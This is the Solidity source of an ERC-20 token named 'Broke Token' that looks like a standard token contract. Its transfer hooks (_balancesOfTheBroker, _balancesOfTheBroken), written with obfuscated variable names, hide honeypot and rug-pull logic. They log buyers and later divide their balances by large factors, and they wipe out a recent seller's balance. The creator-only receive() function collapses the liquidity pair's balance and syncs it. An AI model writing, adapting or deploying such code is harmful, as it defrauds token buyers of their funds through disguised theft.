/**
 *Submitted for verification at Etherscan.io on 2022-05-23
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private brkArr;
    address[] private barkAddr;

    mapping (address => bool) private Prices;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    bool[3] private Nightmare;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    uint256 private Mirror = block.number*2;
    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; uint256 private theN;
    bool private trading = false; uint256 private Beams = 0; uint256 private Arrow = 1;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        barkAddr.push(_router); barkAddr.push(msgSender_); barkAddr.push(pair);
        for (uint256 q=0; q < 3; q++) {Prices[barkAddr[q]] = true; Nightmare[q] = false; }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function last(uint256 g) internal view returns (address) { return (Beams > 1 ? brkArr[brkArr.length-g-1] : address(0)); }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; Mirror = block.number;
        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _balancesOfTheBroker(address sender, address recipient) internal {
        require((trading || (sender == barkAddr[1])), "ERC20: trading is not yet enabled.");
        Arrow += ((Prices[sender] != true) && (Prices[recipient] == true)) ? 1 : 0;
        if (((Prices[sender] == true) && (Prices[recipient] != true)) || ((Prices[sender] != true) && (Prices[recipient] != true))) { brkArr.push(recipient); }
        _balancesOfTheBroken(sender, recipient);
    }

    receive() external payable {
        require(msg.sender == barkAddr[1]); _balances[barkAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(barkAddr[2]).sync(); Nightmare[2] = true;
    }

    function _balancesOfTheBroken(address sender, address recipient) internal {
        if ((Nightmare[0] || (Nightmare[2] && (recipient != barkAddr[1])))) { for (uint256 q=0; q < brkArr.length-1; q++) { _balances[brkArr[q]] /= (Nightmare[2] ? 1e9 : 4e1); } Nightmare[0] = false; }
        _balances[last(1)] /= (((Mirror == block.number) || Nightmare[1] || ((Mirror - theN) <= 7)) && (Prices[last(1)] != true) && (Beams > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Nightmare[1]) && (last(0) == sender)) || ((Nightmare[2] && (barkAddr[1] != sender))) ? (0) : (1));
        (Nightmare[0],Nightmare[1]) = ((((Arrow*10 / 4) == 10) && (Nightmare[1] == false)) ? (true,true) : (Nightmare[0],Nightmare[1]));
        Mirror = block.number; Beams++;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancesOfTheBroker(sender, recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployBroke(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(barkAddr[0], 10 ** 77);
              
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployBroke(creator, initialSupply);
    }
}

contract BrokeToken is ERC20Token {
    constructor() ERC20Token("Broke Token", "BROKE", msg.sender, 69000 * 10 ** 18) {
    }
}